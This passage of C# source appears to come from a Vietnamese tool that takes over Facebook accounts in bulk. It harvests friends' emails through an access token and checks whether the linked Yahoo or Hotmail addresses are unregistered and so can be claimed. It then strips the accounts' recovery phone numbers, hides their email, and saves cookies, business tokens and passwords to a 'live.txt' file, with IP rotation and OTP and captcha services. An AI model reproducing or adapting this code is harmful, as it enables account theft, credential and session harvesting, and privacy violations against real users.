                                if (ckbDeleteInfo.Checked)
                                {
                                    chrome.Navigate().GoToUrl("https://www.facebook.com/settings?tab=mobile");
                                    Thread.Sleep(500);
                                    bool isHavePhone = true;
                                    var tt = chrome.FindElementsByTagName("img").Where(x =>
                                    {
                                        try
                                        {
                                            if (x.GetAttribute("class").Equals("uiLoadingIndicatorAsync img"))
                                                return true;
                                            else
                                                return false;
                                        }
                                        catch
                                        {
                                            return false;
                                        };
                                    }).ToList();
                                    int countDeletePhone = 0;
                                    do
                                    {
                                        if (tt.Count > 0)
                                        {
                                            string xp = FileXpathFromElement(js, tt[0]);
                                            string idBtnRemove = Regex.Match(xp, "id\\(\"(.*?)\"\\)").Groups[1].Value;
                                            if (!idBtnRemove.Equals(""))
                                            {
                                                chrome.FindElementById(idBtnRemove).Click();
                                                Thread.Sleep(1500);
                                                var cl = chrome.FindElementsByTagName("button").Where(x =>
                                                {
                                                    try
                                                    {
                                                        if (x.GetAttribute("class").Contains("layerConfirm"))
                                                            return true;
                                                        else
                                                            return false;
                                                    }
                                                    catch
                                                    {
                                                        return false;
                                                    };
                                                }).ToList();
                                                if (cl.Count > 0)
                                                {
                                                    cl[0].Click();
                                                    Thread.Sleep(1500);
                                                    try
                                                    {
                                                        chrome.FindElementById("ajax_password").SendKeys(passFacebook);
                                                    }
                                                    catch { }
                                                    cl = chrome.FindElementsByTagName("button").Where(x =>
                                                    {
                                                        try
                                                        {
                                                            if (x.GetAttribute("class").Contains("layerConfirm"))
                                                                return true;
                                                            else
                                                                return false;
                                                        }
                                                        catch
                                                        {
                                                            return false;
                                                        };
                                                    }).ToList();
                                                    if (cl.Count > 0)
                                                    {
                                                        cl[0].Click();
                                                        countDeletePhone++;
                                                        Thread.Sleep(1500);
                                                    }
                                                }
                                            }
                                            tt = chrome.FindElementsByTagName("img").Where(x =>
                                            {
                                                try
                                                {
                                                    if (x.GetAttribute("class").Equals("uiLoadingIndicatorAsync img"))
                                                        return true;
                                                    else
                                                        return false;
                                                }
                                                catch
                                                {
                                                    return false;
                                                };
                                            }).ToList();
                                            if (tt.Count <= 0)
                                            {
                                                isHavePhone = false;
                                                break;
                                            }
                                        }
                                        else
                                        {
                                            break;
                                        }
                                    } while (isHavePhone == true);
                                }

                                var cookies = chrome.Manage().Cookies.AllCookies;
                                string cook = "";
                                var session = chrome.Manage().Cookies.AllCookies.ToArray();
                                foreach (OpenQA.Selenium.Cookie cookie in session)
                                {
                                    cook += cookie.Name + "=" + cookie.Value + ";";
                                }
                                if (ckbHideMail.Checked)
                                {
                                    ChangePryvacyMail(cook);
                                }
                                string token = "";
                                if (checkBox1.Checked)
                                    token = GetTokenBussinessFromCookie(cook);
                                File.AppendAllText("account//live.txt", uid + "|" + passFacebook + "|" + token + "|" + cook + "|" + email + "|" + passYahoo + "\r\n");
                                LoadStatusGrid("Thành công!", "cStatusMail", i, 4, dtgvChangeVia);
                                if (ckbNoRegYahoo.Checked == true)
                                {
                                    chrome.Manage().Cookies.DeleteAllCookies();
                                }
                                chrome.Quit();
                            }
                            else
                            {
                                LoadStatusGrid("Lỗi!", "cStatusMail", i, 2, dtgvChangeVia);
                                chrome.Quit();
                            }
                        }
                    }
                    else
                    {
                        File.AppendAllText("account//nootp.txt", email + "|" + passFacebook + "|" + email + "|" + passYahoo + "\r\n");
                        dtgvChangeVia.Rows[i].Cells["cStatusMail"].Value = "Không nhận được OTP!";
                    }
                }
            }
            catch (Exception ex)
            {
                try
                {
                    File.AppendAllText(@"log\log.txt", ex.ToString() + "|" + DateTime.Now.ToString());
                    File.AppendAllText(@"log\log.html", chrome.PageSource);
                }
                catch { }
                LoadStatusGrid("Lỗi không xác định!", "cStatusMail", i, 2, dtgvChangeVia);
                //File.WriteAllText("log/" + "error.txt", chrome.PageSource);
                try
                {
                    chrome.Quit();
                }
                catch { }
            }
        }

        public bool ChangePryvacyMail(string cookie)
        {
            bool isDone = true;
            try
            {
                string uid = Regex.Match(cookie, "c_user=(.*?);").Groups[1].Value;
                #region Khai báo request
                xNet.HttpRequest request = new xNet.HttpRequest();
                request.KeepAlive = true;
                request.Cookies = new CookieDictionary();
                request.AddHeader(HttpHeader.Accept, "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8");
                request.AddHeader(HttpHeader.AcceptLanguage, "en-US,en;q=0.5");
                request.UserAgent = "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) coc_coc_browser/77.0.126 Chrome/71.0.3578.126 Safari/537.36";
                #endregion
                request.AddHeader("Cookie", cookie);
                string html = request.Get("https://www.facebook.com/").ToString();
                if (uid.Equals("") == false && html.Contains(uid) && html.Contains("name=\"fb_dtsg\" value="))
                {
                    request.AddHeader("Cookie", cookie);
                    string htmlDelete = request.Get("https://mbasic.facebook.com/settings/email/").ToString();
                    string linkPryvacy = Regex.Match(htmlDelete, "/privacyx/selector(.*?)\"").Value.Replace("amp;", "").Replace("\"", "");
                    request.AddHeader("Cookie", cookie);
                    string htmlPryvacy = request.Get("https://mbasic.facebook.com" + linkPryvacy + "&priv_expand=see_all").ToString();
                    string linkOnlyMe = Regex.Match(htmlPryvacy, "/a/privacy/.px=286958161406148(.*?)\"").Value.Replace("amp;", "").Replace("\"", "");
                    if (linkOnlyMe.Equals(""))
                    {
                        return false;
                    }
                    request.AddHeader("Cookie", cookie);
                    string doneRequest = request.Get("https://mbasic.facebook.com" + linkOnlyMe).ToString();
                    isDone = true;
                    //File.WriteAllText("dmm.html", doneRequest);
                }
                else
                {
                    isDone = false;
                }
            }
            catch
            {
                isDone = false;
            }
            return isDone;
        }

        public void KillProcessChromeDriver()
        {
            Process[] chromeDriverProcesses = Process.GetProcessesByName("chromedriver");

            foreach (var chromeDriverProcess in chromeDriverProcesses)
            {
                chromeDriverProcess.Kill();
            }
        }


        private string TenVietNam()
        {
            //string tenvn = "Kim Quyên|Phước Thiện|Quỳnh Trân|Vinh|Bính|Huỳnh Ngọc Dung|Vân|Thanh Bích|Thu Hiền|Bảo Ngọc|Thảo|Huỳnh Trúc Vy|Bá Duy|Thuỳ Linh|Huyền Trâm|Ngọc Hoa|Hoàng Quyên|Ngọc Điệp|Thanh Hà|Hoàng Phương|Trúc Ly|Trâm|Trang Oanh|Mỹ|Như|Lai|Kim|Phúc|Phương";
            string tenvn = File.ReadAllText("ten.txt");
            //string tenvn = "Kim|Quyen|Phuoc|Thien|Quynh|Vinh|Binh||Dung|Van|Thanh|Bich|Thu|Hien|Bao|Ngoc|Thao|Truc|Vy|Ba|Duy|Thuy|Linh|Huyen|Tram|Ngoc|Hoa|Quyen|Ngoc|Diep|Thanh|Ha|Hoang|Truc|Ly|Tram|Trang|Oanh|My|Nhu|Lai|Kim|Phuc|Phuong";
            string[] ArrayTen = tenvn.Split('|');
            string ten = ArrayTen[rd.Next(0, ArrayTen.Length - 1)];
            return ten;
        }

        private string HoVietNam()
        {
            // string hoten = "Nguyễn|Trần|Lê|Phạm|Hoàng|Huỳnh|Phan|Vũ|Võ|Đặng|Đinh|Trịnh|Đoàn|Bùi|Đỗ|Hồ|Ngô|Dương|Lý|Đào|Ưng|Liễu|Mai";
            string hoten = "Nguyen|Tran|Le|Pham|Hoang|Huynh|Phan|Vu|Vo|Dang|Dinh|Trinh|Doan|Bui|Do|Ho|Ngo|Duong|Ly|Dao|Ung|Lieu|Mai";
            string[] ArrayHo = hoten.Split('|');
            string ho = ArrayHo[rd.Next(0, ArrayHo.Length - 1)];
            return ho;
        }

        private string CreateRandomPassword(int length = 15)
        {
            // Create a string of characters, numbers, special characters that allowed in the password  
            string validChars = "ABCDEFGHJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789";
            Random random = new Random();

            // Select one random character at a time from the string  
            // and create an array of chars  
            char[] chars = new char[length];
            for (int i = 0; i < length - 2; i++)
            {
                chars[i] = validChars[random.Next(0, validChars.Length)];
            }
            chars[13] = '1'; chars[14] = 'T';
            return new string(chars);
        }

        private string CreateRandomNameImage(int length = 15)
        {
            // Create a string of characters, numbers, special characters that allowed in the password  
            string validChars = "ABCDEFGHJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789";
            Random random = new Random();

            // Select one random character at a time from the string  
            // and create an array of chars  
            char[] chars = new char[length];
            for (int i = 0; i < length - 2; i++)
            {
                chars[i] = validChars[random.Next(0, validChars.Length)];
            }
            chars[13] = '1'; chars[14] = 'T';
            return new string(chars);
        }

        private string GetIp()
        {
            string ipReturn = "";
            try
            {
                #region Khai báo request
                xNet.HttpRequest request = new xNet.HttpRequest();
                request.KeepAlive = true;
                request.Cookies = new CookieDictionary();
                request.AddHeader(HttpHeader.Accept, "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8");
                request.AddHeader(HttpHeader.AcceptLanguage, "en-US,en;q=0.5");
                request.UserAgent = Http.ChromeUserAgent();
                #endregion

                string checkIP = request.Get("https://whoer.net/fr").ToString();
                Match ip = Regex.Match(checkIP, @"\b\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}\b");
                if (ip.Success)
                {
                    ipReturn = ip.Value.Trim();
                }
            }
            catch
            {
                ipReturn = "Lỗi lấy IP";
            }
            return ipReturn;
        }

        private void MainForm_Load(object sender, EventArgs e)
        {
            cbbTel.SelectedIndex = 0;
            LoadSetting();
            new Thread(() =>
            {
                LoadMail();
                lblIdMachine.Invoke(new Action(delegate ()
                {
                    lblIdMachine.Text = Program.GetIdMarchine();
                }));
            }).Start();
        }

        private void LoadMail()
        {
            try
            {
                string[] arr = File.ReadAllLines("data.txt");
                if (arr.Length > 0)
                {
                    try
                    {
                        for (int i = 0; i < arr.Length; i++)
                        {
                            string r = arr[i];
                            string[] rs = r.Split('|');
                            dtgvChangeVia.Invoke(new Action(delegate ()
                            {
                                dtgvChangeVia.Rows.Add(rs[0], rs[1], rs[2], "", rs[3], rs[4]);
                            }));
                        }
                    }
                    catch
                    {

                    }
                }
            }
            catch { }
        }

        private void LoadSetting()
        {
            txbPasswordFb.Text = Settings.Default.txbPasswordFb;
            txbPasswordYahoo.Text = Settings.Default.txbPasswordYahoo;
            txbApiKeySimthue.Text = Settings.Default.txbApiKeySimthue;
            if (Settings.Default.typeChangeIp == 0)
                rdNone.Checked = true;
            else if (Settings.Default.typeChangeIp == 1)
                rdDcom.Checked = true;
            else if (Settings.Default.typeChangeIp == 2)
                rdHma.Checked = true;
            if (Settings.Default.apiType == 0)
                rdSimthue.Checked = true;
            ckbRandomMail.Checked = Settings.Default.ckbRandomMail;
            ckbRandomFacebook.Checked = Settings.Default.ckbRandomFacebook;
            nudThread.Value = Settings.Default.nudThread;
            nudChangeIpCount.Value = Settings.Default.nudChangeIpCount;
            ckbDeleteInfo.Checked = Settings.Default.ckbDeleteInfo;
            ckbLogoutDevice.Checked = Settings.Default.ckbLogoutDevice;
            ckbProfile.Checked = Settings.Default.ckbProfile;
            txbAnticaptcha.Text = Settings.Default.txbAnticaptcha;
            ckbShowIp.Checked = Settings.Default.ckbShowIp;
            txbTokenTemp.Text = Settings.Default.txbTokenTemp;
            txbCookieTemp.Text = Settings.Default.txbCookieTemp;
        }

        private void BtnPause_Click(object sender, EventArgs e)
        {
            isStop = true;
            rControl("stop");
        }

        private void rControl(string dt)
        {
            this.Invoke((MethodInvoker)delegate ()
            {
                if (dt == "start")
                {
                    btnStart.Enabled = false;
                    btnPause.Enabled = true;
                }
                else if (dt == "stop")
                {
                    btnStart.Enabled = true;
                    btnPause.Enabled = false;
                }
            });
        }

        private void BtnCheckBalance_Click(object sender, EventArgs e)
        {
            #region Khai báo request
            xNet.HttpRequest request = new xNet.HttpRequest();
            request.KeepAlive = true;
            request.Cookies = new CookieDictionary();
            request.AddHeader(HttpHeader.Accept, "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8");
            request.AddHeader(HttpHeader.AcceptLanguage, "en-US,en;q=0.5");
            request.UserAgent = Http.ChromeUserAgent();
            #endregion
            try
            {
                if (rdSimthue.Checked)
                {
                    string html = request.Get("http://api.pvaonline.net/balance?key=" + txbApiKeySimthue.Text).ToString();
                    JObject objCheck = JObject.Parse(html);
                    lblBalance.Text = "" + objCheck["balance"].ToString();
                }
            }
            catch
            {

            }
        }

        private void ChọnTấtCảToolStripMenuItem_Click(object sender, EventArgs e)
        {
            for (int i = 0; i < dtgvChangeVia.RowCount; i++)
            {
                dtgvChangeVia.Rows[i].Cells["cChoseMail"].Value = true;
            }
        }

        private void BỏChọnTấtCảToolStripMenuItem_Click(object sender, EventArgs e)
        {
            for (int i = 0; i < dtgvChangeVia.RowCount; i++)
            {
                dtgvChangeVia.Rows[i].Cells["cChoseMail"].Value = false;
            }
        }

        private void PasToolStripMenuItem_Click(object sender, EventArgs e)
        {
            try
            {
                DataObject o = (DataObject)Clipboard.GetDataObject();
                string[] pastedRows = Regex.Split(o.GetData(DataFormats.Text).ToString().TrimEnd("\r\n".ToCharArray()), "\r\n");
                foreach (string pastedRow in pastedRows)
                {
                    if (!pastedRow.Replace("\t", "").Equals(""))
                    {
                        string[] pastedRowCells = pastedRow.Split(new char[] { '\t' });
                        if (pastedRowCells.Length == 1)
                        {
                            int myRowIndex = dtgvChangeVia.Rows.Add();
                            dtgvChangeVia.Rows[myRowIndex].Cells[2].Value = pastedRowCells[0];
                        }
                        else if (pastedRowCells.Length == 2)
                        {
                            int myRowIndex = dtgvChangeVia.Rows.Add();
                            for (int i = 0; i < 2; i++)
                            {
                                dtgvChangeVia.Rows[myRowIndex].Cells[i + 1].Value = pastedRowCells[i];
                            }
                        }
                        else if (pastedRowCells.Length == 3)
                        {
                            int myRowIndex = dtgvChangeVia.Rows.Add();
                            dtgvChangeVia.Rows[myRowIndex].Cells[1].Value = pastedRowCells[0];
                            dtgvChangeVia.Rows[myRowIndex].Cells[2].Value = pastedRowCells[1];
                            dtgvChangeVia.Rows[myRowIndex].Cells[4].Value = pastedRowCells[2];
                        }
                    }
                }
            }
            catch { }
        }

        private void XóaToolStripMenuItem_Click(object sender, EventArgs e)
        {
            for (int i = 0; i < dtgvChangeVia.RowCount; i++)
            {
                if (Convert.ToBoolean(dtgvChangeVia.Rows[i].Cells["cChoseMail"].Value))
                {
                    dtgvChangeVia.Rows.RemoveAt(i);
                    i--;
                }
            }
        }

        private void ChọnLiveToolStripMenuItem_Click(object sender, EventArgs e)
        {
            for (int i = 0; i < dtgvChangeVia.RowCount; i++)
            {

                if (dtgvChangeVia.Rows[i].Cells["cStatusMail"].Value != null)
                {
                    if (dtgvChangeVia.Rows[i].Cells["cStatusMail"].Value.ToString().Equals("Live"))
                    {
                        dtgvChangeVia.Rows[i].Cells["cChoseMail"].Value = true;
                    }
                    else
                        dtgvChangeVia.Rows[i].Cells["cChoseMail"].Value = false;
                }
            }
        }

        private void ChọnDieToolStripMenuItem_Click(object sender, EventArgs e)
        {
            for (int i = 0; i < dtgvChangeVia.RowCount; i++)
            {

                if (dtgvChangeVia.Rows[i].Cells["cStatusMail"].Value != null)
                {
                    if (dtgvChangeVia.Rows[i].Cells["cStatusMail"].Value.ToString().Equals("Die"))
                    {
                        dtgvChangeVia.Rows[i].Cells["cChoseMail"].Value = true;
                    }
                    else
                        dtgvChangeVia.Rows[i].Cells["cChoseMail"].Value = false;
                }
            }
        }

        private void ChọnYahooToolStripMenuItem_Click(object sender, EventArgs e)
        {
            for (int i = 0; i < dtgvChangeVia.RowCount; i++)
            {

                if (dtgvChangeVia.Rows[i].Cells["cMailMail"].Value != null)
                {
                    if (dtgvChangeVia.Rows[i].Cells["cMailMail"].Value.ToString().EndsWith("@yahoo.com"))
                    {
                        dtgvChangeVia.Rows[i].Cells["cChoseMail"].Value = true;
                    }
                    else
                        dtgvChangeVia.Rows[i].Cells["cChoseMail"].Value = false;
                }

            }
        }

        private void ChọnHotmailToolStripMenuItem_Click(object sender, EventArgs e)
        {
            for (int i = 0; i < dtgvChangeVia.RowCount; i++)
            {
                if (dtgvChangeVia.Rows[i].Cells["cMailMail"].Value != null)
                {
                    if (dtgvChangeVia.Rows[i].Cells["cMailMail"].Value.ToString().EndsWith("@hotmail.com"))
                    {
                        dtgvChangeVia.Rows[i].Cells["cChoseMail"].Value = true;
                    }
                    else
                        dtgvChangeVia.Rows[i].Cells["cChoseMail"].Value = false;
                }
            }
        }

        private void CheckMailToolStripMenuItem_Click(object sender, EventArgs e)
        {
            int iThread = 0;
            int maxThread = 10;
            new Thread(() =>
            {
                for (int i = 0; i < dtgvChangeVia.Rows.Count;)
                {
                    if (Convert.ToBoolean(dtgvChangeVia.Rows[i].Cells["cChoseMail"].Value))
                    {
                        if (iThread < maxThread)
                        {
                            Interlocked.Increment(ref iThread);
                            int row = i;
                            new Thread(() =>
                            {
                                CheckMail(row);
                                Interlocked.Decrement(ref iThread);
                            }).Start();
                            i++;
                        }
                        else
                        {
                            Thread.Sleep(100);
                        }
                    }
                    else
                    {
                        i++;
                    }
                }
            }).Start();
        }

        private bool CheckMailYahoo(string mail)
        {
            bool isLive = false;
            mail = mail.Replace("@yahoo.com", "");
            #region Khai báo request
            RequestHTTP request = new RequestHTTP();
            request.SetSSL(System.Net.SecurityProtocolType.Tls12);
            request.SetKeepAlive(true);
            request.SetDefaultHeaders(new string[]
            {
                    "content-type: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
                    "user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.131 Safari/537.36",
                    "X-Requested-With: XMLHttpRequest",
                    "Cookie: AS=v=1&s=jc8Jz1UA",
                    "Referrer: https://login.yahoo.com/account/module/create?validateField=yid"
            });
            #endregion
            string checkLive = request.Request("POST", "https://login.yahoo.com/account/module/create?validateField=yid", null, Encoding.UTF8.GetBytes("browser-fp-data=&specId=yidReg&crumb=&acrumb=jc8Jz1UA&c=&s=&done=https%3A%2F%2Fwww.yahoo.com&googleIdToken=&authCode=&tos0=yahoo_freereg%7Cvn%7Cvi-VN&tos1=yahoo_comms_atos%7Cvn%7Cvi-VN&firstName=&lastName=&yid=" + mail + "&password=&shortCountryCode=VN&phone=&mm=&dd=&yyyy=&freeformGender="));
            if (checkLive.Contains("yid\",\"error"))
            {
                isLive = true;
            }
            return isLive;
        }

        private bool CheckMailHotmail(string mail)
        {
            bool isLive = false;
            mail = mail.Replace("@yahoo.com", "");
            #region Khai báo request
            RequestHTTP request = new RequestHTTP();
            request.SetSSL(System.Net.SecurityProtocolType.Tls12);
            request.SetKeepAlive(true);
            request.SetDefaultHeaders(new string[]
            {
                    "content-type: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
                    "user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.131 Safari/537.36",
            });
            #endregion
            string checkLive = request.Request("GET", "https://login.microsoftonline.com/common/userrealm/?user=" + mail + "&api-version=2.1&stsRequest=rQIIAbPSySgpKSi20tcvyC8qSczRy81MLsovzk8ryc_LycxL1UvOz9XLL0rPTAGxioS4BC6HNYTFGB7zWy90MI6xcUHgKkZlwkboX2BkfMHIeItJ0L8o3TMlvNgtNSW1KLEkMz_vERNvaHFqkX9eTmVIfnZq3iRmvpz89My8-OKitPi0nPxyoADQhILE5JL4kszk7NSSXcwqiSaWqYZpKWm6xpZplromhiZmupYWiWa6FhYmZqaGFqlpFomJF1gEfrAwLmIFurmyae30LeVybvNE3C_Vi-5_e4pVPy_FOcvSIiIgNUPbJyU1KjE0PTcsMdezzCM5PN2oJN8zyN0g0MjZ3bzSuNzW0srwACcjAA2&checkForMicrosoftAccount=true").ToString();
            JObject oCheck = JObject.Parse(checkLive);
            if (oCheck["MicrosoftAccount"].ToString().Equals("1"))
            {
                isLive = false;
            }
            else
            {
                isLive = true;
            }
            return isLive;
        }

        private void CheckMail(object data)
        {
            int row = (int)data;
            try
            {
                string mail = dtgvChangeVia.Rows[row].Cells["cMailMail"].Value.ToString();
                dtgvChangeVia.Rows[row].Cells["cStatusMail"].Value = "Đang kiểm tra...";
                if (mail.EndsWith("@yahoo.com"))
                {
                    if (CheckMailYahoo(mail))
                    {
                        dtgvChangeVia.Rows[row].Cells["cStatusMail"].Value = "Live";
                    }
                    else
                    {
                        dtgvChangeVia.Rows[row].Cells["cStatusMail"].Value = "Die";
                    }
                }
                else if (mail.EndsWith("@hotmail.com"))
                {

                    if (CheckMailHotmail(mail) == false)
                    {
                        dtgvChangeVia.Rows[row].Cells["cStatusMail"].Value = "Die";
                    }
                    else
                    {
                        dtgvChangeVia.Rows[row].Cells["cStatusMail"].Value = "Live";
                    }
                }
                else
                {
                    dtgvChangeVia.Rows[row].Cells["cStatusMail"].Value = "Lỗi định dạng!";
                }
            }
            catch
            {
                //dtgvChangeVia.Rows[row].Cells["cStatusMail"].Value = "Live";
            }
        }

        private void PasteToolStripMenuItem_Click(object sender, EventArgs e)
        {
            try
            {
                DataObject o = (DataObject)Clipboard.GetDataObject();
                string[] pastedRows = Regex.Split(o.GetData(DataFormats.Text).ToString().TrimEnd("\r\n".ToCharArray()), "\r\n");
                foreach (string pastedRow in pastedRows)
                {
                    if (!pastedRow.Equals("\t"))
                    {
                        string[] pastedRowCells = pastedRow.Split(new char[] { '\t' });
                        if (pastedRowCells.Length == 1)
                        {
                            int myRowIndex = dtgvScanUid.Rows.Add();
                            dtgvScanUid.Rows[myRowIndex].Cells["token"].Value = pastedRowCells[0];
                        }
                    }
                }
            }
            catch { }
        }

        private void BtnScanUid_Click(object sender, EventArgs e)
        {
            int iThread = 0;
            int maxThread = 2;
            new Thread(() =>
            {
                btnScanUid.Invoke((MethodInvoker)delegate ()
                {
                    btnScanUid.Enabled = false;
                });
                for (int i = 0; i < dtgvScanUid.Rows.Count;)
                {
                    if (Convert.ToBoolean(dtgvScanUid.Rows[i].Cells["chose"].Value))
                    {
                        if (iThread < maxThread)
                        {
                            Interlocked.Increment(ref iThread);
                            int row = i;
                            new Thread(() =>
                            {
                                ScanUidOneThread(row);
                                Interlocked.Decrement(ref iThread);
                            }).Start();
                            i++;
                        }
                        else
                        {
                            Thread.Sleep(100);
                        }
                    }
                    else
                    {
                        i++;
                    }
                }
                while (iThread > 0)
                {
                    Thread.Sleep(500);
                    Application.DoEvents();
                }
                btnScanUid.Invoke((MethodInvoker)delegate ()
                {
                    btnScanUid.Enabled = true;
                });
            }).Start();
        }
        private void ScanUidOneThread(int rowIndex)
        {
            try
            {
                dtgvScanUid.Invoke((MethodInvoker)delegate ()
                {
                    dtgvScanUid.Rows[rowIndex].Cells["status"].Value = "Đang quét...";
                });
                DataGridViewRow r = dtgvScanUid.Rows[rowIndex];
                string token = r.Cells["token"].Value.ToString();
                #region Khai báo request
                xNet.HttpRequest request = new xNet.HttpRequest();
                request.KeepAlive = true;
                request.Cookies = new CookieDictionary();
                request.AddHeader(HttpHeader.Accept, "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8");
                request.AddHeader(HttpHeader.AcceptLanguage, "en-US,en;q=0.5");
                request.UserAgent = Http.ChromeUserAgent();
                #endregion
                string linkPost = "https://graph.facebook.com/v2.11/me/friends/?access_token=" + token + "&fields=id,email,name,location,hometown&limit=5000";
                string getInfor = request.Get(linkPost).ToString();
                JObject objEmail = JObject.Parse(getInfor);
                //dtgvScanUid.Invoke((MethodInvoker)delegate ()
                //{
                //    //dtgvScanUid.Rows[rowIndex].Cells(false, objMe["id"], objMe["name"], objMe["friends"]["summary"]["total_count"], "", r, "Live");
                //    dtgvScanUid.Rows[rowIndex].Cells["uid"].Value= objEmail["data"][]["id"]
                //});
                int countFind = 0;
                for (int j = 0; j < objEmail["data"].Count(); j++)
                {
                    string email = "";
                    try
                    {
                        email = objEmail["data"][j]["email"].ToString();
                    }
                    catch
                    {

                    }
                    if (email != "")
                    {
                        if (email.EndsWith("@yahoo.com"))
                        {
                            if (CheckMailYahoo(email) == false)
                            {
                                countFind++;
                                string lk = "https://graph.facebook.com/v2.11/" + objEmail["data"][j]["id"] + "/friends/?access_token=" + token + "&limit=0";
                                string jsonLk = request.Get(lk).ToString();
                                JObject objFriends = JObject.Parse(jsonLk);
                                string friends = "0";
                                try
                                {
                                    friends = objFriends["summary"]["total_count"].ToString();
                                }
                                catch
                                {

                                }
                                dtgvVia.Invoke(new Action(delegate ()
                                {
                                    dtgvVia.Rows.Add(false, objEmail["data"][j]["id"], objEmail["data"][j]["name"], friends, email, "");
                                }));
                            }
                        }
                        else if (email.EndsWith("@hotmail.com"))
                        {
                            if (CheckMailHotmail(email) == false)
                            {
                                countFind++;
                                string lk = "https://graph.facebook.com/v2.11/" + objEmail["data"][j]["id"] + "/friends/?access_token=" + token + "&limit=0";
                                string jsonLk = request.Get(lk).ToString();
                                JObject objFriends = JObject.Parse(jsonLk);
                                string friends = "0";
                                try
                                {
                                    friends = objFriends["summary"]["total_count"].ToString();
                                }
                                catch
                                {

                                }
                                dtgvVia.Invoke(new Action(delegate ()
                                {
                                    dtgvVia.Rows.Add(false, objEmail["data"][j]["id"], objEmail["data"][j]["name"], friends, email, "");
                                }));
                            }
                        }
                    }
                }
                dtgvScanUid.Rows[rowIndex].Cells["status"].Value = "Quét được " + countFind + " uid";
            }
            catch
            {
                dtgvScanUid.Invoke((MethodInvoker)delegate ()
                {
                    dtgvScanUid.Rows[rowIndex].Cells["status"].Value = "Lỗi!";
                });
            }
        }

        private void ChọnTấtCảToolStripMenuItem1_Click(object sender, EventArgs e)
        {
            for (int i = 0; i < dtgvScanUid.RowCount; i++)
            {
                dtgvScanUid.Rows[i].Cells["chose"].Value = true;
            }
        }

        private void BỏChọnTấtCảToolStripMenuItem1_Click(object sender, EventArgs e)
        {
            for (int i = 0; i < dtgvScanUid.RowCount; i++)
            {
                dtgvScanUid.Rows[i].Cells["chose"].Value = false;
            }
        }

        private void XóaToolStripMenuItem1_Click(object sender, EventArgs e)
        {
            for (int i = 0; i < dtgvScanUid.RowCount; i++)
            {
                if (Convert.ToBoolean(dtgvScanUid.Rows[i].Cells["chose"].Value))
                {
                    dtgvScanUid.Rows.RemoveAt(i);
                    i--;
                }
            }
        }

        private void ToolStripMenuItem2_Click(object sender, EventArgs e)
        {
            for (int i = 0; i < dtgvVia.RowCount; i++)
            {
                if (Convert.ToBoolean(dtgvVia.Rows[i].Cells["cChose"].Value))
                {
                    dtgvVia.Rows.RemoveAt(i);
                    i--;
                }
            }
        }

        private void ChọnTấtCảToolStripMenuItem2_Click(object sender, EventArgs e)
        {
            for (int i = 0; i < dtgvVia.RowCount; i++)
            {
                dtgvVia.Rows[i].Cells["cChose"].Value = true;
            }
        }

        private void BỏChọnTấtCảToolStripMenuItem2_Click(object sender, EventArgs e)
        {
            for (int i = 0; i < dtgvVia.RowCount; i++)
            {
                dtgvVia.Rows[i].Cells["cChose"].Value = false;
            }
        }

        private void CopyToolStripMenuItem_Click(object sender, EventArgs e)
        {
            try
            {
                string textCopy = "";
                for (int i = 0; i < dtgvVia.RowCount; i++)
                {
                    if (Convert.ToBoolean(dtgvVia.Rows[i].Cells["cChose"].Value))
                    {
                        textCopy += dtgvVia.Rows[i].Cells["cUid"].Value.ToString() + "\t" + dtgvVia.Rows[i].Cells["cEmail"].Value.ToString() + "\r\n";
                    }
                }
                Clipboard.SetText(textCopy);
            }
            catch { }

        }

        private void DeleteImageCaptcha()
        {
            try
            {
                string[] filePaths = Directory.GetFiles("data");
                foreach (string filePath in filePaths)
                    File.Delete(filePath);
            }
            catch { }
        }

        private void CmdAddFile_Click(object sender, EventArgs e)
        {
            OpenFileDialog fopen = new OpenFileDialog();

            if (fopen.ShowDialog() == DialogResult.OK)
            {
                try
                {
                    string filename = fopen.FileName;
                    string[] arrToken = File.ReadAllLines(filename);
                    if (arrToken.Length > 0)
                    {
                        for (int i = 0; i < arrToken.Length; i++)
                        {
                            dtgvScanUid.Rows.Add(false, "", "", "", "", arrToken[i], "");
                        }
                    }
                }
                catch { }

            }
        }

        void CheckToken(string r)
        {
            string linkPost = "https://graph.facebook.com/v2.11/me/?access_token=" + r + "&fields=name,friends";
            #region Khai báo request
            xNet.HttpRequest request = new xNet.HttpRequest();
            request.KeepAlive = true;
            request.Cookies = new CookieDictionary();
            request.AddHeader(HttpHeader.Accept, "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8");
            request.AddHeader(HttpHeader.AcceptLanguage, "en-US,en;q=0.5");
            request.UserAgent = Http.ChromeUserAgent();
            #endregion
            string getInfor = request.Get(linkPost).ToString();
            JObject objMe = JObject.Parse(getInfor);
            try
            {
                string check = objMe["id"].ToString();
            }
            catch
            {
                dtgvScanUid.Invoke((MethodInvoker)delegate ()
                {
                    dtgvScanUid.Rows.Add(false, "", "", "", "", "", r, "Die");
                });
                return;
            }
            dtgvScanUid.Invoke((MethodInvoker)delegate ()
            {
                dtgvScanUid.Rows.Add(false, objMe["id"], objMe["name"], objMe["friends"]["summary"]["total_count"], "", r, "Live");
            });
        }

        private void BntExport_Click(object sender, EventArgs e)
        {
            SaveFileDialog saveFileDialog = new SaveFileDialog();
            saveFileDialog.DefaultExt = "xls";
            saveFileDialog.Filter = "Excel |*.xls";
            saveFileDialog.AddExtension = true;
            saveFileDialog.RestoreDirectory = true;
            saveFileDialog.InitialDirectory = "C:/";
            if (saveFileDialog.ShowDialog() == DialogResult.OK)
            {
                string fileName = saveFileDialog.FileName;
                HSSFWorkbook hssfworkbook = new HSSFWorkbook();
                ISheet sheet = hssfworkbook.CreateSheet();
                sheet.SetColumnWidth(0, 5120);
                sheet.SetColumnWidth(1, 5120);
                sheet.SetColumnWidth(2, 5120);
                sheet.SetColumnWidth(3, 5120);
